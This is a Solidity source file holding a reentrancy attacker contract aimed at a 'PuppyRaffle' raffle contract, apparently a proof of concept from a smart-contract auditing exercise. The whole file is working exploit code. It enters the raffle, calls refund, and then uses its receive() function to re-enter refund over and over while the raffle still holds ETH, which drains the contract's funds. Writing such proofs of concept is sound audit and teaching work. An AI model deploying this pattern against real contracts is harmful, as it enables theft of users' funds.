// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public attackerIndex;
    uint256 public entranceFee;

    constructor(address _raffle) {
        raffle = PuppyRaffle(_raffle);
        entranceFee = raffle.entranceFee();
    }

    // Step 1: enter the raffle, then trigger the first refund
    function attack() external payable {
        require(msg.value == entranceFee, "Send exactly 1 entrance fee");
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(attackerIndex);
    }

    // Step 2: every time ETH arrives, re-enter refund() before name is crossed off
    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(attackerIndex);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
